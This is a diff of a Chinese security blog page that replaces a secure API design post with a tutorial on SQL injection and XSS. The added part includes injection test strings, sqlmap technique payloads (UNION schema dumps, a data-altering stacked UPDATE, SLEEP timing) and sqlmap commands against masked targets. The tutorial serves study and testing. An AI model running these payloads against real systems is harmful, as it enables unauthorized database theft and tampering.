@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>设计API需要注意的一些安全问题 - jweny`s Blog | Security &amp; Develop</title>
+  <title>sqli &amp; xss - jweny`s Blog | Security &amp; Develop</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
 
@@ -162,7 +162,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="设计API需要注意的一些安全问题">
+            <span class="h2" id="subtitle" title="sqli & xss">
               
             </span>
 
@@ -172,8 +172,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2020-06-04 19:14" pubdate>
-        2020年6月4日 晚上
+      <time datetime="2018-12-05 09:55" pubdate>
+        2018年12月5日 上午
       </time>
     </span>
   
@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      943 字
+      1.4k 字
     </span>
   
 
@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      11
+      17
        分钟
     </span>
   
@@ -224,91 +224,131 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">设计API需要注意的一些安全问题</h1>
+            <h1 style="display: none">sqli &amp; xss</h1>
             
             <div class="markdown-body">
-              <h1 id="设计API-需要注意的安全问题"><a href="#设计API-需要注意的安全问题" class="headerlink" title="设计API 需要注意的安全问题"></a>设计API 需要注意的安全问题</h1><hr>
-<h2 id="1-身份认证"><a href="#1-身份认证" class="headerlink" title="1 身份认证"></a>1 身份认证</h2><ol>
-<li>使用标准的认证协议（如 <a target="_blank" rel="noopener" href="https://jwt.io/">JWT</a>，<a target="_blank" rel="noopener" href="https://oauth.net/">OAuth</a>），不要使用 <code>Basic Auth</code> 。</li>
-<li>限制密码错误尝试次数。</li>
-<li>密码加密传输。</li>
-<li>验证码验证一次后立即失效。</li>
+              <h1 id="sqli-amp-xss"><a href="#sqli-amp-xss" class="headerlink" title="sqli &amp; xss"></a>sqli &amp; xss</h1><h2 id="一、sqli"><a href="#一、sqli" class="headerlink" title="一、sqli"></a>一、sqli</h2><h3 id="1-1-原理与危害"><a href="#1-1-原理与危害" class="headerlink" title="1.1 原理与危害"></a>1.1 原理与危害</h3><pre><code>sql注入是将恶意的sql查询或者语句添加到应用的输入参数中，然后在后台的服务器数据库上解析执行进行攻击，如果用户输入恶意sql查询代码，web应用又没有对输入的sql查询进行审查，就会出现该漏洞。危害：</code></pre>
+<ol>
+<li><p>猜解后台数据库，这是最常见的情况，窃取大量数据库敏感数据</p>
+</li>
+<li><p>借助数据库进行提权</p>
+</li>
+<li><p>绕过验证直接登录</p>
+</li>
 </ol>
-<h3 id="1-1-JWT"><a href="#1-1-JWT" class="headerlink" title="1.1  JWT"></a>1.1  JWT</h3><ol>
-<li>不要自己实现生成token的算法（无法确保安全性），请使用标准库。</li>
-<li>使用标准的认证请求头。不要在 URL 中携带任何敏感的数据（<code>credentials</code>，<code>Passwords</code>，<code>security tokens</code>，or <code>API keys</code>）。</li>
-<li>使用随机复杂的密钥（<code>JWT Secret</code>）以增加暴力破解的难度。</li>
-<li>不要在 JWT 的请求体中存放敏感数据，因为它是<a target="_blank" rel="noopener" href="https://jwt.io/#debugger-io">可解码的</a>。</li>
-<li>token的过期时间尽可能短。主动退出时，立即清除token。</li>
-</ol>
-<h2 id="2-权限校验"><a href="#2-权限校验" class="headerlink" title="2 权限校验"></a>2 权限校验</h2><ol>
-<li>每个接口都应严格校验请求内容与token所有者的权限。</li>
-<li><strong>平行越权</strong>：普通用户A 查看 普通用户B的资产信息。例如<code>/asset/111/</code>接口没有校验当前token是否为该资产所有者，通过修改id即可遍历所有资产。</li>
-<li><strong>垂直越权</strong>：普通用户A 提权为管理员。接口反序列化时，只接受必要的字段，不要将所有用户输入字段均反序列化入库。如个人信息编辑接口，直接修改 id / role / permission， 或添加某些字段，将自己修改为管理员。 </li>
-</ol>
-<h2 id="3-接口滥用"><a href="#3-接口滥用" class="headerlink" title="3 接口滥用"></a>3 接口滥用</h2><ol>
-<li>敏感接口限制请求频率，来防止 DoS 攻击 / 其他爆破攻击。如：</li>
-</ol>
+<h3 id="1-2-手工判断注入点"><a href="#1-2-手工判断注入点" class="headerlink" title="1.2 手工判断注入点"></a>1.2 手工判断注入点</h3><p>**关键点：让查询条件闭合，以下均为简单示例，实际场景中除了闭合引号，还可能存在括号等 **</p>
 <ul>
-<li>短信验证码</li>
-<li>登录</li>
-<li>大文件下载</li>
-<li>构建Docker镜像 / 启动容器</li>
+<li><p>初步探测：</p>
+<ul>
+<li><p>加入单引号 ‘ 提交，如果报错，则该网站可能就存在注入漏洞。</p>
+</li>
+<li><p>加入双引号 “ 提交，如果报错，则该网站可能就存在注入漏洞。</p>
+</li>
+<li><p>如果单引号报错，双引号不报错；或者单引号不报错，双引号报错，说明存在注入漏洞。</p>
+</li>
 </ul>
+</li>
+</ul>
+<ul>
+<li><p>数字型sql注入探测：</p>
+<p><code>select user from users where id = 1</code></p>
+<ul>
+<li><p>方法1：尝试 news.asp?id=123 and 1=1 和 news.asp?id=123 and 1=2 返回不同的页面,说明存在注入漏洞。（分析：and前后语句有一个为假则整个查询条件为假，因此and 1=1 返回正常页面，and 1=2 时会查询错误或不返回记录。）</p>
+</li>
+<li><p>方法2：尝试 news.asp?id=123 or 2&gt;1  和 news.asp?id=123 or 1&gt;2 返回不同的页面,说明存在注入漏洞。（分析：or前后语句有一个为真则整个查询条件为真，or 1=1 永真条件返回所有记录，or 1=2 返回原来相同的结果）</p>
+</li>
+<li><p>方法3：尝试对注入点进行 -1 和 -0。例如 news.asp?id=123-0 和 news.asp?id=123-1 如果返回不同的页面，说明存在注入漏洞。（分析：123-0时返回原来相同的结果，如果123-1时返回其他页面或页面没找到，表示存在注入漏洞。）</p>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>字符型sql注入探测：</p>
+<p><code>select user from users where id = &#39;1&#39;</code></p>
+<ul>
+<li><p>方法1：news.asp?id=123’ and ‘1’=’1 and  news.asp?id=123’ and ‘1’=’2 分别返回不同的页面,说明存在注入漏洞。（分析：加入’ and ‘1’=’1返回正确页面，and ‘1’=’2 返回查询记录或不返回记录，说明有注入漏洞。）</p>
+</li>
+<li><p>或将上述语句’ 换成双引号</p>
+</li>
+<li><p>其他方法可类比数字型，将数字型转为字符型</p>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>表单提交/搜索框时，还可以通过通配符判断。例如先搜索 ‘，如果出错，然后搜索%，如果正常返回，说明存在注入漏洞。</li>
+</ul>
+<ul>
+<li><p>报错形式：</p>
+<ul>
+<li>数据库查询错误直接回显在页面上</li>
+<li>错误隐藏在页面源代码中</li>
+<li>检测到错误跳转到另一个页面</li>
+<li>返回HTTP错误代码500或重定向302</li>
+<li>适当处理错误结果，显示一个通用错误页面</li>
+</ul>
+</li>
+</ul>
+<h3 id="1-3-使用sqlmap"><a href="#1-3-使用sqlmap" class="headerlink" title="1.3 使用sqlmap"></a>1.3 使用sqlmap</h3><h4 id="1-3-1-中文手册"><a href="#1-3-1-中文手册" class="headerlink" title="1.3.1 中文手册"></a>1.3.1 中文手册</h4><pre><code>https://parrotsec-cn.org/t/topic/834</code></pre>
+<h4 id="1-3-2-sqlmap探测分类"><a href="#1-3-2-sqlmap探测分类" class="headerlink" title="1.3.2 sqlmap探测分类"></a>1.3.2 sqlmap探测分类</h4><ul>
+<li><p>B: Boolean-based blind SQL injection（布尔型盲注）</p>
+<p>通过判断页面返回情况获得想要的信息，比如数据库版本。<br>id=1’ and select(substring(version(),1,1))=5 #<br>id=1’ and length(database())&gt;1 #</p>
+</li>
+</ul>
+<ul>
+<li><p>E: Error-based SQL injection（报错型注入）</p>
+<p>id=1’ and/**/extractvalue(1,concat(char(126),md5(1274754846)))and’<br>当然如果报错的数据不能回显，就无法使用报错注入，这时候我们就可以考虑是否存在盲注。</p>
+</li>
+</ul>
+<ul>
+<li><p>U: UNION query SQL injection（联合查询注入）</p>
+<p><a target="_blank" rel="noopener" href="http://hello.com/view?id=1">http://hello.com/view?id=1</a> UNION ALL SELECT SCHEMA_NAME, DEFAULT_CHARACTER_SET_NAME FROM INFORMATION_SCHEMA.SCHEMATA</p>
+</li>
+</ul>
+<ul>
+<li><p>S: Stacked queries SQL injection（可多语句查询注入）</p>
+<p><a target="_blank" rel="noopener" href="http://hello.com/view?id=1;update">http://hello.com/view?id=1;update</a> t1 set content = ‘aaaaaaaaa’    </p>
+</li>
+</ul>
+<ul>
+<li><p>T: Time-based blind SQL injection（时间型盲注）</p>
+<p><a target="_blank" rel="noopener" href="http://hello.com/view?q=abc&#39;">http://hello.com/view?q=abc&#39;</a> AND (SELECT * FROM (SELECT(SLEEP(5)))VCVe) OR 1 = ‘<br>返回时间应该 &gt;= 5s，要考虑网络延迟。</p>
+</li>
+</ul>
+<h4 id="1-3-3-POST请求场景"><a href="#1-3-3-POST请求场景" class="headerlink" title="1.3.3 POST请求场景"></a>1.3.3 POST请求场景</h4><ol>
+<li>表单</li>
+</ol>
+<p>url:</p>
+<pre><code>http://x.x.x.x/CAS/login;jsessionid=210B6748C19502F7B11B46AE0395061F?service=http%3A%2F%2Fwww.cqdcyl.cn%3A80%2Fmanager%2F?_eventId=submit&amp;checkCode=vsd&amp;execution=e1s1&amp;lt=LT-7429992-Nfq75vnkHQdavQoEcfVxbJV0Zsi9rt&amp;username=8&amp;password=8:select8</code></pre>
+<p>cmd:</p>
+<pre><code>python3 sqlmap.py -u https://x.x.x.x/index/more_goods_list.html --method=post --data=&#39;keyword=1&amp;__hash__=ef68966cb9753eb6e09c5f4a4847be1d_cd750e8d572395c1b439ed6fd2fa9497&#39;</code></pre>
 <ol start="2">
-<li>如果不知道频率要限为多少，那就先定个默认值，根据实际情况做调整，不要放任不管。</li>
-<li>如果接口逻辑复杂或数据处理量很大，尽可能使用队列异步处理来避免阻塞请求，从而快速响应客户端。</li>
-<li>不用的接口 / 测试接口，上线前必须下掉。</li>
+<li><p>json</p>
+<p>sqlmap.py -u ‘<a target="_blank" rel="noopener" href="http://localhost/sqltest.php&#39;">http://localhost/sqltest.php&#39;</a> –data=’{“id”:”1”}’</p>
+</li>
+<li><p>抓包读文件：抓包后使用 -r sqlmap会自动识别post参数</p>
+<p>burp抓包后 copy to file </p>
+</li>
 </ol>
-<h2 id="4-逻辑"><a href="#4-逻辑" class="headerlink" title="4 逻辑"></a>4 逻辑</h2><ol>
-<li><strong>所有的接口都必须包含身份认证和权限校验。</strong></li>
-<li>使用 HTTPS。</li>
-<li>避免使用自增长 id，使用 <code>UUID</code> 代替自增长的 id，尽量使用 <code>/me/orders</code> 替代 <code>/user/123/orders</code>。</li>
-<li>关闭DEBUG 模式。</li>
-</ol>
-<h2 id="5-处理请求"><a href="#5-处理请求" class="headerlink" title="5 处理请求"></a>5 处理请求</h2><ol>
-<li>限制HTTP请求方法（<code>GET / POST / PUT / DELETE</code>），如果请求的方法不适用，返回 <code>405 Method Not Allowed</code>。登录、注册、重置密码等涉及用户敏感信息的操作，接口必须使用POST方法，不要接受GET方法的请求。</li>
-<li>限制 <code>content-type</code> 请求头 ，只允许支持的格式（如 <code>application/xml</code>，<code>application/json</code> 等），并在不满足条件的时候返回 <code>406 Not Acceptable</code>。</li>
-<li>验证 <code>content-type</code> 中申明的格式和请求正文的格式是否一致。</li>
-<li>严格验证 / 控制用户的输入，来避免一些通用漏洞（如 <code>XSS</code>，<code>SQL注入</code>，<code>远程代码执行</code>，文件上传 等等）。</li>
-</ol>
-<ul>
-<li>SQL注入：</li>
+<p>cmd</p>
+<pre><code>sqlmap.py -r &quot;filepath&quot; -p keyword
+* -r 参数：读文件 -p 指定检测的参数</code></pre>
+<h4 id="1-3-4-GET请求场景"><a href="#1-3-4-GET请求场景" class="headerlink" title="1.3.4 GET请求场景"></a>1.3.4 GET请求场景</h4><p>url：</p>
+<pre><code>http://x.x.x.x/proview.asp?lm=2&amp;id=198</code></pre>
+<p>cmd:</p>
+<pre><code>python3 sqlmap.py -u http://x.x.x.x/proview.asp?lm=2&amp;id=198</code></pre>
+<h2 id="二、xss"><a href="#二、xss" class="headerlink" title="二、xss"></a>二、xss</h2><h3 id="2-1-漏洞原理"><a href="#2-1-漏洞原理" class="headerlink" title="2.1 漏洞原理"></a>2.1 漏洞原理</h3><pre><code>往Web页面里插入恶意javaScript代码，当用户浏览该页之时，嵌入其中Web里面的javaScript代码会被执行，从而达到恶意攻击用户的目的。</code></pre>
+<h3 id="2-2-检测原理"><a href="#2-2-检测原理" class="headerlink" title="2.2 检测原理"></a>2.2 检测原理</h3><ul>
+<li>发送随机字符</li>
+<li>确认参数回显</li>
+<li>通过html/js解析确认回显位置</li>
+<li>根据回显的上下文发送不同的payload进行测试</li>
+<li>使用html，js语法树解析是否多出来标签，属性，js语句等来确定是否执行成功</li>
 </ul>
-<pre><code class="hljs go"><span class="hljs-comment">// 错误写法：直接拼接</span>
-customerId := r.URL.Query().Get(<span class="hljs-string">&quot;id&quot;</span>)
-query := <span class="hljs-string">&quot;SELECT number, expireDate, cvv FROM creditcards WHERE customerId = &quot;</span> + customerId
-<span class="hljs-comment">// SELECT number, expireDate, cvv FROM creditcards WHERE customerId = 1 OR 1=1</span></code></pre>
-
-<pre><code class="hljs go"><span class="hljs-comment">// 正确写法：预编译</span>
-ctx := context.Background()
-customerId := r.URL.Query().Get(<span class="hljs-string">&quot;id&quot;</span>)
-<span class="hljs-comment">// mysql 占位符 ?</span>
-query := <span class="hljs-string">&quot;SELECT number, expireDate, cvv FROM creditcards WHERE customerId = ?&quot;</span>
-stmt, _ := db.QueryContext(ctx, query, customerId)</code></pre>
-
-<ul>
-<li>XSS：</li>
+<h3 id="2-3-注意事项"><a href="#2-3-注意事项" class="headerlink" title="2.3 注意事项"></a>2.3 注意事项</h3><ul>
+<li>payload可能有多种原因无法直接回显（弹窗），所以建议去查看响应的DOM树（F12开发者模式-elements），看是否多出来标签/属性/js语句。</li>
+<li>chrome 内置 CSP，因此想直接回显的话建议使用firefox。</li>
 </ul>
-<pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>tech.meituan.com<span class="hljs-regexp">/2018/</span><span class="hljs-number">09</span><span class="hljs-regexp">/27/</span>fe-security.html</code></pre>
-
-<ul>
-<li>命令执行：</li>
-</ul>
-<pre><code class="hljs gcode">comma<span class="hljs-symbol">nd1</span> &amp;&amp; comma<span class="hljs-symbol">nd2</span>  先执行comma<span class="hljs-symbol">nd1</span>后执行comma<span class="hljs-symbol">nd2</span>
-comma<span class="hljs-symbol">nd1</span> | comma<span class="hljs-symbol">nd2</span>   只执行comma<span class="hljs-symbol">nd2</span>
-comma<span class="hljs-symbol">nd1</span> &amp; comma<span class="hljs-symbol">nd2</span>	先执行comma<span class="hljs-symbol">nd2</span>后执行comma<span class="hljs-symbol">nd1</span></code></pre>
-
-<ul>
-<li>文件上传：</li>
-</ul>
-<pre><code class="hljs lasso">严格校验文件格式。处理<span class="hljs-built_in">xml</span>文件时，注意xxe漏洞。条件允许的情况下，禁止外部dtd。</code></pre>
-
-<h2 id="6-处理响应"><a href="#6-处理响应" class="headerlink" title="6 处理响应"></a>6 处理响应</h2><ol>
-<li>删除响应中的指纹。如 <code>X-Powered-By</code>，<code>Server</code>，<code>X-AspNet-Version</code> 等。</li>
-<li>遵循请求的 <code>content-type</code>。如果请求类型是 <code>application/json</code> 那么响应 <code>content-type</code> 就是 <code>application/json</code>。</li>
-<li>统一的4xx / 5xx 页面：不返回具体的报错信息。</li>
-</ol>
 
             </div>
             <hr>
@@ -318,7 +358,7 @@ comma<span class="hljs-symbol">nd1</span> &amp; comma<span class="hljs-symbol">n
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/%E5%BC%80%E5%8F%91/">开发</a>
+                      <a class="hover-with-bg" href="/categories/%E6%BC%8F%E6%B4%9E/">漏洞</a>
                     
                   </div>
                 
@@ -326,7 +366,7 @@ comma<span class="hljs-symbol">nd1</span> &amp; comma<span class="hljs-symbol">n
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/">安全开发</a>
+                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
                     
                   </div>
                 
@@ -337,21 +377,15 @@ comma<span class="hljs-symbol">nd1</span> &amp; comma<span class="hljs-symbol">n
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2020/06/29/%E7%BB%99Blog%E6%8D%A2%E4%B8%AA%E7%9A%AE%E8%82%A4/">
+                      <a href="/2020/04/26/ThinkCMF-%E6%A8%A1%E6%9D%BF%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">给Blog换个皮肤</span>
+                        <span class="hidden-mobile">ThinkCMF 模板缓存漏洞分析</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
                   </article>
                   <article class="post-next col-6">
                     
-                    
-                      <a href="/2020/04/26/ThinkCMF-%E6%A8%A1%E6%9D%BF%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
-                        <span class="hidden-mobile">ThinkCMF 模板缓存漏洞分析</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
                     
                   </article>
                 </div>
